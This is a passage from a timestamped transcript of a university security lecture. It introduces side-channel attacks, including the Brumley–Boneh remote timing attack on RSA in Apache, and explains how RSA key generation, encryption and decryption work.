            <slice>
              <time_slice>1:10</time_slice>
              <text_slice>between the user and
the server reveals</text_slice>
            </slice>
            <slice>
              <time_slice>1:12</time_slice>
              <text_slice>some additional information
that you wouldn't have otherwise</text_slice>
            </slice>
            <slice>
              <time_slice>1:16</time_slice>
              <text_slice>learned by just observing the
bits flowing between these two</text_slice>
            </slice>
            <slice>
              <time_slice>1:19</time_slice>
              <text_slice>guys.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20</time_slice>
              <text_slice>But In fact, there's a much
broader class of side-channels</text_slice>
            </slice>
            <slice>
              <time_slice>1:24</time_slice>
              <text_slice>you might worry about.</text_slice>
            </slice>
            <slice>
              <time_slice>1:25</time_slice>
              <text_slice>Originally,
side-channels showed up,</text_slice>
            </slice>
            <slice>
              <time_slice>1:28</time_slice>
              <text_slice>or people discovered them in
the '40s when they discovered</text_slice>
            </slice>
            <slice>
              <time_slice>1:31</time_slice>
              <text_slice>that when you start
typing characters</text_slice>
            </slice>
            <slice>
              <time_slice>1:33</time_slice>
              <text_slice>on a teletype the electronics,
or the electrical machinery</text_slice>
            </slice>
            <slice>
              <time_slice>1:37</time_slice>
              <text_slice>in the teletype, would
emit RF radiation.</text_slice>
            </slice>
            <slice>
              <time_slice>1:39</time_slice>
              <text_slice>And you can hook up
an oscilloscope nearby</text_slice>
            </slice>
            <slice>
              <time_slice>1:41</time_slice>
              <text_slice>and just watch the
characters being typed out</text_slice>
            </slice>
            <slice>
              <time_slice>1:44</time_slice>
              <text_slice>by monitoring the frequency
or RF frequencies that</text_slice>
            </slice>
            <slice>
              <time_slice>1:48</time_slice>
              <text_slice>are going out of this machine.</text_slice>
            </slice>
            <slice>
              <time_slice>1:49</time_slice>
              <text_slice>So RF radiation is a classic
example of a side-channel</text_slice>
            </slice>
            <slice>
              <time_slice>1:54</time_slice>
              <text_slice>that you might worry about.</text_slice>
            </slice>
            <slice>
              <time_slice>1:57</time_slice>
              <text_slice>And there's lots of examples
lots of other examples</text_slice>
            </slice>
            <slice>
              <time_slice>2:00</time_slice>
              <text_slice>that people have looked
at, almost anything.</text_slice>
            </slice>
            <slice>
              <time_slice>2:02</time_slice>
              <text_slice>So power usage is
another side-channel</text_slice>
            </slice>
            <slice>
              <time_slice>2:07</time_slice>
              <text_slice>you might worry about.</text_slice>
            </slice>
            <slice>
              <time_slice>2:08</time_slice>
              <text_slice>So your computer
is probably going</text_slice>
            </slice>
            <slice>
              <time_slice>2:09</time_slice>
              <text_slice>to use different amounts of
power depending on what exactly</text_slice>
            </slice>
            <slice>
              <time_slice>2:12</time_slice>
              <text_slice>it's computing.</text_slice>
            </slice>
            <slice>
              <time_slice>2:13</time_slice>
              <text_slice>I'm gonna go into other
clever examples of sound</text_slice>
            </slice>
            <slice>
              <time_slice>2:17</time_slice>
              <text_slice>turns out to also leak stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>2:19</time_slice>
              <text_slice>There's a [? cute ?] paper
that you can look at.</text_slice>
            </slice>
            <slice>
              <time_slice>2:21</time_slice>
              <text_slice>The people listen to a
printer and based on the sound</text_slice>
            </slice>
            <slice>
              <time_slice>2:25</time_slice>
              <text_slice>the printer is
making you can tell</text_slice>
            </slice>
            <slice>
              <time_slice>2:26</time_slice>
              <text_slice>what characters it's printing.</text_slice>
            </slice>
            <slice>
              <time_slice>2:28</time_slice>
              <text_slice>This is especially easy to do
for dot matrix printers that</text_slice>
            </slice>
            <slice>
              <time_slice>2:31</time_slice>
              <text_slice>make this very annoying
sound when they're printing.</text_slice>
            </slice>
            <slice>
              <time_slice>2:35</time_slice>
              <text_slice>And in general, a good
thing to think about,</text_slice>
            </slice>
            <slice>
              <time_slice>2:38</time_slice>
              <text_slice>Kevin on Monday's
lecture also mentioned</text_slice>
            </slice>
            <slice>
              <time_slice>2:40</time_slice>
              <text_slice>some interesting side-channels
that he's running through</text_slice>
            </slice>
            <slice>
              <time_slice>2:43</time_slice>
              <text_slice>in his research.</text_slice>
            </slice>
            <slice>
              <time_slice>2:45</time_slice>
              <text_slice>But, in particular,
here we're going</text_slice>
            </slice>
            <slice>
              <time_slice>2:49</time_slice>
              <text_slice>to look at the
specific side-channel</text_slice>
            </slice>
            <slice>
              <time_slice>2:51</time_slice>
              <text_slice>that David Brumley and Dan Boneh
looked at in their paper-- I</text_slice>
            </slice>
            <slice>
              <time_slice>2:56</time_slice>
              <text_slice>guess about 10 years ago now--
where they were able to extract</text_slice>
            </slice>
            <slice>
              <time_slice>2:59</time_slice>
              <text_slice>a cryptographic key out of
a web server running Apache</text_slice>
            </slice>
            <slice>
              <time_slice>3:03</time_slice>
              <text_slice>by measuring the timing
of different responses</text_slice>
            </slice>
            <slice>
              <time_slice>3:06</time_slice>
              <text_slice>to different input packets
from the adversarial client.</text_slice>
            </slice>
            <slice>
              <time_slice>3:11</time_slice>
              <text_slice>And in this particular
case, they're</text_slice>
            </slice>
            <slice>
              <time_slice>3:14</time_slice>
              <text_slice>going after a cryptographic key.</text_slice>
            </slice>
            <slice>
              <time_slice>3:15</time_slice>
              <text_slice>In fact, many
side-channel attacks</text_slice>
            </slice>
            <slice>
              <time_slice>3:17</time_slice>
              <text_slice>target cryptographic keys
partly because it's a little bit</text_slice>
            </slice>
            <slice>
              <time_slice>3:21</time_slice>
              <text_slice>tricky to get lots of data
through a side-channel.</text_slice>
            </slice>
            <slice>
              <time_slice>3:24</time_slice>
              <text_slice>And cryptographic
keys are one situation</text_slice>
            </slice>
            <slice>
              <time_slice>3:26</time_slice>
              <text_slice>where getting a small number
of bits helps you a lot.</text_slice>
            </slice>
            <slice>
              <time_slice>3:30</time_slice>
              <text_slice>So in their attack they're
able to extract maybe</text_slice>
            </slice>
            <slice>
              <time_slice>3:32</time_slice>
              <text_slice>about 200 256 bits or so.</text_slice>
            </slice>
            <slice>
              <time_slice>3:36</time_slice>
              <text_slice>And just from those
200ish bits, they're</text_slice>
            </slice>
            <slice>
              <time_slice>3:38</time_slice>
              <text_slice>able to break the cryptographic
key of this web server.</text_slice>
            </slice>
            <slice>
              <time_slice>3:42</time_slice>
              <text_slice>Whereas, if you're
trying to leak</text_slice>
            </slice>
            <slice>
              <time_slice>3:43</time_slice>
              <text_slice>some database full of
Social Security numbers,</text_slice>
            </slice>
            <slice>
              <time_slice>3:46</time_slice>
              <text_slice>then that'll be
a lot of bits you</text_slice>
            </slice>
            <slice>
              <time_slice>3:48</time_slice>
              <text_slice>have to leak to get
out of this database.</text_slice>
            </slice>
            <slice>
              <time_slice>3:51</time_slice>
              <text_slice>So that's why many of
these side-channels,</text_slice>
            </slice>
            <slice>
              <time_slice>3:53</time_slice>
              <text_slice>if you'll see them
later on, they often</text_slice>
            </slice>
            <slice>
              <time_slice>3:55</time_slice>
              <text_slice>focus on getting
small secrets out,</text_slice>
            </slice>
            <slice>
              <time_slice>3:59</time_slice>
              <text_slice>might be cryptographic
keys or passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>4:02</time_slice>
              <text_slice>But in general, this
is applicable to lots</text_slice>
            </slice>
            <slice>
              <time_slice>4:04</time_slice>
              <text_slice>of other situations as well.</text_slice>
            </slice>
            <slice>
              <time_slice>4:09</time_slice>
              <text_slice>And one cool thing
about this paper,</text_slice>
            </slice>
            <slice>
              <time_slice>4:11</time_slice>
              <text_slice>before we jump into
the details, is</text_slice>
            </slice>
            <slice>
              <time_slice>4:13</time_slice>
              <text_slice>that they show that you actually
do this over the network.</text_slice>
            </slice>
            <slice>
              <time_slice>4:16</time_slice>
              <text_slice>So as you probably figured
out from reading this paper,</text_slice>
            </slice>
            <slice>
              <time_slice>4:18</time_slice>
              <text_slice>they have to do a
lot of careful work</text_slice>
            </slice>
            <slice>
              <time_slice>4:20</time_slice>
              <text_slice>to tease out these
minute differences</text_slice>
            </slice>
            <slice>
              <time_slice>4:23</time_slice>
              <text_slice>in timing information.</text_slice>
            </slice>
            <slice>
              <time_slice>4:24</time_slice>
              <text_slice>So if you actually compute out
the numbers from this paper,</text_slice>
            </slice>
            <slice>
              <time_slice>4:28</time_slice>
              <text_slice>it turns out that each request
that they sent to the server</text_slice>
            </slice>
            <slice>
              <time_slice>4:33</time_slice>
              <text_slice>differs from potentially
another [? website ?]</text_slice>
            </slice>
            <slice>
              <time_slice>4:35</time_slice>
              <text_slice>by an order of 1 to
2 microseconds, which</text_slice>
            </slice>
            <slice>
              <time_slice>4:39</time_slice>
              <text_slice>is pretty tiny.</text_slice>
            </slice>
            <slice>
              <time_slice>4:41</time_slice>
              <text_slice>So you have to be quite
careful, and all of our network</text_slice>
            </slice>
            <slice>
              <time_slice>4:47</time_slice>
              <text_slice>it might be hard to tell
whether some server took</text_slice>
            </slice>
            <slice>
              <time_slice>4:50</time_slice>
              <text_slice>1 or 2 microseconds longer to
process your request or not.</text_slice>
            </slice>
            <slice>
              <time_slice>4:53</time_slice>
              <text_slice>And as a result, it was not
so clear for whether you</text_slice>
            </slice>
            <slice>
              <time_slice>4:58</time_slice>
              <text_slice>could mount this kind of attack
over a very noisy network.</text_slice>
            </slice>
            <slice>
              <time_slice>5:01</time_slice>
              <text_slice>And these guys were
one of the first people</text_slice>
            </slice>
            <slice>
              <time_slice>5:03</time_slice>
              <text_slice>to show that you can actually
do this over a real ethernet</text_slice>
            </slice>
            <slice>
              <time_slice>5:06</time_slice>
              <text_slice>network with a server sitting
in one place, a client sitting</text_slice>
            </slice>
            <slice>
              <time_slice>5:09</time_slice>
              <text_slice>somewhere else.</text_slice>
            </slice>
            <slice>
              <time_slice>5:10</time_slice>
              <text_slice>And you could actually
measure these differences</text_slice>
            </slice>
            <slice>
              <time_slice>5:12</time_slice>
              <text_slice>partly by averaging, partly
through other tricks.</text_slice>
            </slice>
            <slice>
              <time_slice>5:16</time_slice>
              <text_slice>All right, does that make sense,
the overall side-channel stuff?</text_slice>
            </slice>
            <slice>
              <time_slice>5:21</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>5:21</time_slice>
              <text_slice>So the plan for the
rest of this lecture</text_slice>
            </slice>
            <slice>
              <time_slice>5:23</time_slice>
              <text_slice>is we'll first dive into
the details of this RSA</text_slice>
            </slice>
            <slice>
              <time_slice>5:27</time_slice>
              <text_slice>cryptosystem that
these guys use.</text_slice>
            </slice>
            <slice>
              <time_slice>5:29</time_slice>
              <text_slice>Then we'll not look at
exactly why it's secure</text_slice>
            </slice>
            <slice>
              <time_slice>5:32</time_slice>
              <text_slice>or not but we'll look at
how do you implement it</text_slice>
            </slice>
            <slice>
              <time_slice>5:34</time_slice>
              <text_slice>because that turns out to
be critical for exploiting</text_slice>
            </slice>
            <slice>
              <time_slice>5:37</time_slice>
              <text_slice>this particular side-channel.</text_slice>
            </slice>
            <slice>
              <time_slice>5:39</time_slice>
              <text_slice>They carefully leverage various
details of the implementation</text_slice>
            </slice>
            <slice>
              <time_slice>5:42</time_slice>
              <text_slice>to figure out when there are
some things faster or slower.</text_slice>
            </slice>
            <slice>
              <time_slice>5:46</time_slice>
              <text_slice>And then we'll pop back
out once we understand</text_slice>
            </slice>
            <slice>
              <time_slice>5:48</time_slice>
              <text_slice>how RSA is implemented.</text_slice>
            </slice>
            <slice>
              <time_slice>5:49</time_slice>
              <text_slice>Then we'll come back and figure
out how do you attack it,</text_slice>
            </slice>
            <slice>
              <time_slice>5:52</time_slice>
              <text_slice>how do you attack all these
different organizations</text_slice>
            </slice>
            <slice>
              <time_slice>5:54</time_slice>
              <text_slice>that RSA has.</text_slice>
            </slice>
            <slice>
              <time_slice>5:56</time_slice>
              <text_slice>Sounds good?</text_slice>
            </slice>
            <slice>
              <time_slice>5:57</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>5:58</time_slice>
              <text_slice>So I guess let's
start off by looking</text_slice>
            </slice>
            <slice>
              <time_slice>6:00</time_slice>
              <text_slice>at the high level plan for RSA.</text_slice>
            </slice>
            <slice>
              <time_slice>6:04</time_slice>
              <text_slice>So RSA is a pretty widely
used public key cryptosystem.</text_slice>
            </slice>
            <slice>
              <time_slice>6:08</time_slice>
              <text_slice>We've mentioned these
guys a couple of weeks</text_slice>
            </slice>
            <slice>
              <time_slice>6:10</time_slice>
              <text_slice>ago in general in certificates,
in the context of certificates.</text_slice>
            </slice>
            <slice>
              <time_slice>6:14</time_slice>
              <text_slice>But now we're going to look
at actually how it works.</text_slice>
            </slice>
            <slice>
              <time_slice>6:17</time_slice>
              <text_slice>So typically there's 3 things
you have to worry about.</text_slice>
            </slice>
            <slice>
              <time_slice>6:20</time_slice>
              <text_slice>So there's generating a key,
encrypting, and decrypting.</text_slice>
            </slice>
            <slice>
              <time_slice>6:25</time_slice>
              <text_slice>So for RSA, the way you
generate a key is you actually</text_slice>
            </slice>
            <slice>
              <time_slice>6:29</time_slice>
              <text_slice>pick 2 large prime integers.</text_slice>
            </slice>
            <slice>
              <time_slice>6:32</time_slice>
              <text_slice>So you're going to
pick 2 primes, p and q.</text_slice>
            </slice>
            <slice>
              <time_slice>6:35</time_slice>
              <text_slice>And in the paper, these
guys focus on p and q,</text_slice>
            </slice>
            <slice>
              <time_slice>6:42</time_slice>
              <text_slice>which are about 512 bits each.</text_slice>
            </slice>
            <slice>
              <time_slice>6:45</time_slice>
              <text_slice>So this is typically
called 1,024 bit RSA</text_slice>
            </slice>
            <slice>
              <time_slice>6:49</time_slice>
              <text_slice>because the resulting product
of these primes that you're</text_slice>
            </slice>
            <slice>
              <time_slice>6:52</time_slice>
              <text_slice>going to use in a second is
a 1,000 bit integer number.</text_slice>
            </slice>
            <slice>
              <time_slice>6:56</time_slice>
              <text_slice>These days, that's probably
not a particularly good choice</text_slice>
            </slice>
            <slice>
              <time_slice>6:59</time_slice>
              <text_slice>for the size of your
RSA key because it</text_slice>
            </slice>
            <slice>
              <time_slice>7:02</time_slice>
              <text_slice>makes it relatively easy for
attackers to factor this-- not</text_slice>
            </slice>
            <slice>
              <time_slice>7:06</time_slice>
              <text_slice>trivial but certainly viable.</text_slice>
            </slice>
            <slice>
              <time_slice>7:09</time_slice>
              <text_slice>So if 10 years ago, this seemed
like a potentially sensible</text_slice>
            </slice>
            <slice>
              <time_slice>7:12</time_slice>
              <text_slice>parameter, now if you're
actually building a system,</text_slice>
            </slice>
            <slice>
              <time_slice>7:14</time_slice>
              <text_slice>you should probably
pick a 2,000 or 3,000</text_slice>
            </slice>
            <slice>
              <time_slice>7:16</time_slice>
              <text_slice>or even 4,000 bit RSA key.</text_slice>
            </slice>
            <slice>
              <time_slice>7:19</time_slice>
              <text_slice>Well, that's what
RSA key size means</text_slice>
            </slice>
            <slice>
              <time_slice>7:22</time_slice>
              <text_slice>is the size of these primes.</text_slice>
            </slice>
            <slice>
              <time_slice>7:24</time_slice>
              <text_slice>And then, for
convenience, we're going</text_slice>
            </slice>
            <slice>
              <time_slice>7:26</time_slice>
              <text_slice>to talk about the
number n, which</text_slice>
            </slice>
            <slice>
              <time_slice>7:28</time_slice>
              <text_slice>is just the product of
these 2 primes, p times q.</text_slice>
            </slice>
            <slice>
              <time_slice>7:33</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>7:33</time_slice>
              <text_slice>So now we know how
to generate a key,</text_slice>
            </slice>
            <slice>
              <time_slice>7:35</time_slice>
              <text_slice>now we need to figure
out-- well this is at least</text_slice>
            </slice>
            <slice>
              <time_slice>7:38</time_slice>
              <text_slice>part of a key-- now
we're going to have</text_slice>
            </slice>
            <slice>
              <time_slice>7:40</time_slice>
              <text_slice>to figure out how we're going
to encrypt and decrypt messages.</text_slice>
            </slice>
            <slice>
              <time_slice>7:45</time_slice>
              <text_slice>And the way we're going to
encrypt and decrypt messages</text_slice>
            </slice>
            <slice>
              <time_slice>7:48</time_slice>
              <text_slice>is by exponentiating numbers
modulo this number n.</text_slice>
            </slice>
            <slice>
              <time_slice>7:54</time_slice>
              <text_slice>So it seems a little weird, but
let's go with it for a second.</text_slice>
            </slice>
            <slice>
              <time_slice>7:57</time_slice>
              <text_slice>So if you want to
encrypt a message,</text_slice>
            </slice>
            <slice>
              <time_slice>8:00</time_slice>
              <text_slice>then we're going
to take a message m</text_slice>
            </slice>
            <slice>
              <time_slice>8:03</time_slice>
              <text_slice>and transform it into
m to the power e mod m.</text_slice>
            </slice>
            <slice>
              <time_slice>8:11</time_slice>
              <text_slice>So e is going to be some
exponent-- we'll talk about how</text_slice>
            </slice>
            <slice>
              <time_slice>8:14</time_slice>
              <text_slice>to choose it in a second.</text_slice>
            </slice>
            <slice>
              <time_slice>8:15</time_slice>
              <text_slice>But this is how we're
going to encrypt a message.</text_slice>
            </slice>
            <slice>
              <time_slice>8:17</time_slice>
              <text_slice>We'll just take this
message as an integer number</text_slice>
            </slice>
            <slice>
              <time_slice>8:21</time_slice>
              <text_slice>and just exponentiate it.</text_slice>
            </slice>
            <slice>
              <time_slice>8:23</time_slice>
              <text_slice>And then we'll see why
this works in a second,</text_slice>
            </slice>
            <slice>
              <time_slice>8:25</time_slice>
              <text_slice>but let's call this
guy c, ciphertext.</text_slice>
            </slice>
            <slice>
              <time_slice>8:30</time_slice>
              <text_slice>Then to decrypt it, we're
going to somehow find</text_slice>
            </slice>
            <slice>
              <time_slice>8:36</time_slice>
              <text_slice>an interesting
other exponent where</text_slice>
            </slice>
            <slice>
              <time_slice>8:37</time_slice>
              <text_slice>you can take a ciphertext c
and if you exponentiate it</text_slice>
            </slice>
            <slice>
              <time_slice>8:41</time_slice>
              <text_slice>to some power d mod m,
then you'll magically</text_slice>
            </slice>
            <slice>
              <time_slice>8:46</time_slice>
              <text_slice>get back the same message m.</text_slice>
            </slice>
            <slice>
              <time_slice>8:49</time_slice>
              <text_slice>So this is the general plan:
To encrypt, you exponentiate.</text_slice>
            </slice>
            <slice>
              <time_slice>8:52</time_slice>
              <text_slice>To decrypt, you exponentiate
by another exponent.</text_slice>
            </slice>
            <slice>
              <time_slice>8:56</time_slice>
              <text_slice>And in general, it
seems a little hard</text_slice>
            </slice>
            <slice>
              <time_slice>8:58</time_slice>
              <text_slice>to figure out how we're going
to come up with these two</text_slice>
            </slice>
            <slice>
              <time_slice>9:00</time_slice>
              <text_slice>magic numbers that
somehow end up giving us</text_slice>
            </slice>
            <slice>
              <time_slice>9:02</time_slice>
              <text_slice>back the same message.</text_slice>
            </slice>
            <slice>
              <time_slice>9:04</time_slice>
              <text_slice>But it turns out
that if you look</text_slice>
            </slice>
            <slice>
              <time_slice>9:06</time_slice>
              <text_slice>at how exponentiation works
or multiplication works,</text_slice>
            </slice>
            <slice>
              <time_slice>9:12</time_slice>
              <text_slice>modulo of this number n.</text_slice>
            </slice>
            <slice>
              <time_slice>9:14</time_slice>
              <text_slice>Then there's this cool property
that if you have any number x,</text_slice>
            </slice>
            <slice>
              <time_slice>9:22</time_slice>
              <text_slice>and you raise it to what's
called a [? order ?] of phi</text_slice>
            </slice>
            <slice>
              <time_slice>9:26</time_slice>
              <text_slice>function of n-- maybe I'll
use more board space for this.</text_slice>
            </slice>
            <slice>
              <time_slice>9:32</time_slice>
              <text_slice>This seems important.</text_slice>
            </slice>
            <slice>
              <time_slice>9:33</time_slice>
              <text_slice>So if you take x and you
raise it to phi of n,</text_slice>
            </slice>
            <slice>
              <time_slice>9:37</time_slice>
              <text_slice>then this is going to
be equal to 1 mod m.</text_slice>
            </slice>
            <slice>
              <time_slice>9:44</time_slice>
              <text_slice>And this phi function for
our particular choice of n</text_slice>
            </slice>
            <slice>
              <time_slice>9:48</time_slice>
              <text_slice>is pretty straightforward,
it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>9:49</time_slice>
              <text_slice>p minus 1 times q minus 1.</text_slice>
            </slice>
            <slice>
              <time_slice>9:54</time_slice>
              <text_slice>So this gives us hope that maybe
if we pick ed so that e times</text_slice>
            </slice>
            <slice>
              <time_slice>10:01</time_slice>
              <text_slice>d is 5n plus 1, then
we're in good shape.</text_slice>
            </slice>
            <slice>
              <time_slice>10:06</time_slice>
              <text_slice>Because then any message m we
exponentiate it to e and d,</text_slice>
            </slice>
            <slice>
              <time_slice>10:11</time_slice>
              <text_slice>we get back 1 times m
because our ed product</text_slice>
            </slice>
            <slice>
              <time_slice>10:16</time_slice>
              <text_slice>is going to be
roughly 5n plus 1,</text_slice>
            </slice>
            <slice>
              <time_slice>10:19</time_slice>
              <text_slice>or maybe some constant
alpha times 5n plus 1.</text_slice>
            </slice>
            <slice>
              <time_slice>10:25</time_slice>
              <text_slice>Does this make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>10:26</time_slice>
              <text_slice>This is why the message is going
to get decrypted correctly.</text_slice>
            </slice>
            <slice>
              <time_slice>10:30</time_slice>
              <text_slice>And it turns out that there's
a reasonably straightforward</text_slice>
            </slice>
            <slice>
              <time_slice>10:33</time_slice>
              <text_slice>algorithm if you know this
phi value for how to compute</text_slice>
            </slice>
            <slice>
              <time_slice>10:39</time_slice>
              <text_slice>d given an e or e given a d.</text_slice>
            </slice>
            <slice>
              <time_slice>10:42</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>10:42</time_slice>
              <text_slice>Question.</text_slice>
            </slice>
            <slice>
              <time_slice>10:43</time_slice>
              <text_slice>AUDIENCE: Isn't 1 mod n just 1?</text_slice>
            </slice>
            <slice>
              <time_slice>10:45</time_slice>
              <text_slice>PROFESSOR: Yeah, so
far we add one more.</text_slice>
            </slice>
            <slice>
              <time_slice>10:48</time_slice>
              <text_slice>Sorry?</text_slice>
            </slice>
            <slice>
              <time_slice>10:50</time_slice>
              <text_slice>AUDIENCE: Like, up over there.</text_slice>
            </slice>
            <slice>
              <time_slice>10:52</time_slice>
              <text_slice>PROFESSOR: Yeah, this one?</text_slice>
            </slice>
            <slice>
              <time_slice>10:53</time_slice>
              <text_slice>AUDIENCE: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>10:55</time_slice>
              <text_slice>PROFESSOR: Isn't 1 mod n just 1?</text_slice>
            </slice>
            <slice>
              <time_slice>10:57</time_slice>
              <text_slice>Sorry, I mean this.</text_slice>
            </slice>
            <slice>
              <time_slice>10:58</time_slice>
              <text_slice>So when I say this 1 n, it
means that both sides taken 1n</text_slice>
            </slice>
            <slice>
              <time_slice>11:02</time_slice>
              <text_slice>are equal.</text_slice>
            </slice>
            <slice>
              <time_slice>11:04</time_slice>
              <text_slice>So what this means
is if you want</text_slice>
            </slice>
            <slice>
              <time_slice>11:07</time_slice>
              <text_slice>to think of mod as
literally an operator,</text_slice>
            </slice>
            <slice>
              <time_slice>11:10</time_slice>
              <text_slice>you would write this guy
mod m equals 1 mod m.</text_slice>
            </slice>
            <slice>
              <time_slice>11:13</time_slice>
              <text_slice>So that's what mod
m on the side means.</text_slice>
            </slice>
            <slice>
              <time_slice>11:15</time_slice>
              <text_slice>Like, the whole
equality is mod m.</text_slice>
            </slice>
            <slice>
              <time_slice>11:18</time_slice>
              <text_slice>Sorry for the [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>11:21</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>11:22</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>11:24</time_slice>
              <text_slice>So what this basically
means for RSA is that we're</text_slice>
            </slice>
            <slice>
              <time_slice>11:27</time_slice>
              <text_slice>going to pick some value e.</text_slice>
            </slice>
            <slice>
              <time_slice>11:32</time_slice>
              <text_slice>So e is going to be
our encryption value.</text_slice>
            </slice>
            <slice>
              <time_slice>11:34</time_slice>
              <text_slice>And then from e we're going
to generate d to be basically</text_slice>
            </slice>
            <slice>
              <time_slice>11:41</time_slice>
              <text_slice>1 over e mod phi of n.</text_slice>
            </slice>
            <slice>
              <time_slice>11:45</time_slice>
              <text_slice>And there's some
Euclidean algorithms</text_slice>
            </slice>
            <slice>
              <time_slice>11:47</time_slice>
              <text_slice>you can use to do this
computation efficiently.</text_slice>
            </slice>
            <slice>
              <time_slice>11:51</time_slice>
              <text_slice>But in order to do
this you actually</text_slice>
            </slice>
            <slice>
              <time_slice>11:53</time_slice>
              <text_slice>have to know this
phi of n, which</text_slice>
            </slice>
            <slice>
              <time_slice>11:56</time_slice>
              <text_slice>requires knowing the
factorization of our number n</text_slice>
            </slice>
            <slice>
              <time_slice>11:59</time_slice>
              <text_slice>into p and q.</text_slice>
            </slice>
            <slice>
              <time_slice>12:01</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>12:02</time_slice>
              <text_slice>So finally, RSA ends
up being a system where</text_slice>
            </slice>
            <slice>
              <time_slice>12:08</time_slice>
              <text_slice>the public key is this number n
and this encryption exponent e.</text_slice>
            </slice>
            <slice>
              <time_slice>12:13</time_slice>
              <text_slice>So n and e are public,
and d should be private.</text_slice>
            </slice>
            <slice>
              <time_slice>12:16</time_slice>
              <text_slice>So then anyone can
exponentiate a message</text_slice>
            </slice>
            <slice>
              <time_slice>12:18</time_slice>
              <text_slice>to encrypt it for you.</text_slice>
            </slice>
            <slice>
              <time_slice>12:20</time_slice>
              <text_slice>But only you know this
value d and therefore</text_slice>
            </slice>
            <slice>
              <time_slice>12:22</time_slice>
              <text_slice>can decrypt messages.</text_slice>
            </slice>
            <slice>
              <time_slice>12:25</time_slice>
              <text_slice>And as long as you don't know
this factorization of p and q,</text_slice>
            </slice>
            <slice>
              <time_slice>12:30</time_slice>
              <text_slice>of n to p and q,
then you don't know</text_slice>
            </slice>
            <slice>
              <time_slice>12:32</time_slice>
              <text_slice>what this [? phi del ?] is.</text_slice>
            </slice>
            <slice>
              <time_slice>12:33</time_slice>
              <text_slice>And as a result, it's
actually difficult to compute</text_slice>
            </slice>
            <slice>
              <time_slice>12:35</time_slice>
              <text_slice>this d value.</text_slice>
            </slice>
            <slice>
              <time_slice>12:37</time_slice>
              <text_slice>So this is roughly what RSA is.</text_slice>
            </slice>
            <slice>
              <time_slice>12:41</time_slice>
              <text_slice>High level.</text_slice>
            </slice>
            <slice>
              <time_slice>12:43</time_slice>
              <text_slice>Does this make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>12:45</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>12:45</time_slice>
              <text_slice>So there's 2 things I
want to talk about now</text_slice>
            </slice>
            <slice>
              <time_slice>12:48</time_slice>
              <text_slice>that we at least have the basic
[? implementation ?] for RSA.</text_slice>
            </slice>
            <slice>
              <time_slice>12:52</time_slice>
              <text_slice>There's tricks to use it
correctly and pitfalls</text_slice>
            </slice>
            <slice>
              <time_slice>12:55</time_slice>
              <text_slice>and how to use RSA.</text_slice>
            </slice>
            <slice>
              <time_slice>12:57</time_slice>
              <text_slice>And then there's all kinds
of implementation tricks</text_slice>
            </slice>
            <slice>
              <time_slice>12:59</time_slice>
              <text_slice>on how do you actually
implement [? root ?]</text_slice>
            </slice>
            <slice>
              <time_slice>13:02</time_slice>
              <text_slice>code to do these exponentiations
and do them efficiently.</text_slice>
            </slice>
            <slice>
              <time_slice>13:07</time_slice>
              <text_slice>There's actually more
trivial because these are all</text_slice>
            </slice>
            <slice>
              <time_slice>13:10</time_slice>
              <text_slice>large numbers, these are 1,000
bit integers that can't just</text_slice>
            </slice>
            <slice>
              <time_slice>13:13</time_slice>
              <text_slice>do a multiply instruction for.</text_slice>
            </slice>
            <slice>
              <time_slice>13:15</time_slice>
              <text_slice>Probably going to take
a fair amount of time</text_slice>
            </slice>
            <slice>
              <time_slice>13:18</time_slice>
              <text_slice>to do these operations.</text_slice>
            </slice>
            <slice>
              <time_slice>13:20</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>13:20</time_slice>
              <text_slice>So the first thing
I want to mention</text_slice>
            </slice>
            <slice>
              <time_slice>13:22</time_slice>
              <text_slice>is the various RSA pitfalls.</text_slice>
            </slice>
            <slice>
              <time_slice>13:26</time_slice>
              <text_slice>One of them we're actually going
to rely on in a little bit.</text_slice>
            </slice>
            <slice>
              <time_slice>13:31</time_slice>
              <text_slice>One property is, that
it's multiplicative.</text_slice>
            </slice>
            <slice>
              <time_slice>13:38</time_slice>
              <text_slice>So what I mean by this is that
suppose we have 2 messages.</text_slice>
            </slice>
            <slice>
              <time_slice>13:43</time_slice>
              <text_slice>Suppose we have m0 and m1.</text_slice>
            </slice>
            <slice>
              <time_slice>13:46</time_slice>
              <text_slice>And suppose I
encrypt these guys,</text_slice>
            </slice>
            <slice>
              <time_slice>13:49</time_slice>
              <text_slice>so I encrypt m0, I'm going to
get m0 to the power e mod n.</text_slice>
            </slice>
            <slice>
              <time_slice>13:55</time_slice>
              <text_slice>And if I encrypt m1, then
I'd get m1 to the e mod n.</text_slice>
            </slice>
            <slice>
              <time_slice>14:02</time_slice>
              <text_slice>The problem is-- not
necessarily a problem</text_slice>
            </slice>
            <slice>
              <time_slice>14:06</time_slice>
              <text_slice>but could be a
surprise to someone</text_slice>
            </slice>
            <slice>
              <time_slice>14:08</time_slice>
              <text_slice>using RSA-- it's
very easy to generate</text_slice>
            </slice>
            <slice>
              <time_slice>14:11</time_slice>
              <text_slice>an encryption of m0
times m1 because you just</text_slice>
            </slice>
            <slice>
              <time_slice>14:14</time_slice>
              <text_slice>multiply these 2 numbers.</text_slice>
            </slice>
            <slice>
              <time_slice>14:15</time_slice>
              <text_slice>If you multiply these
guys out, you're</text_slice>
            </slice>
            <slice>
              <time_slice>14:18</time_slice>
              <text_slice>going to get m0
m1 to the e mod n.</text_slice>
            </slice>
            <slice>
              <time_slice>14:26</time_slice>
              <text_slice>This is a correct encryption
under this simplistic use</text_slice>
            </slice>
            <slice>
              <time_slice>14:29</time_slice>
              <text_slice>of RSA for the
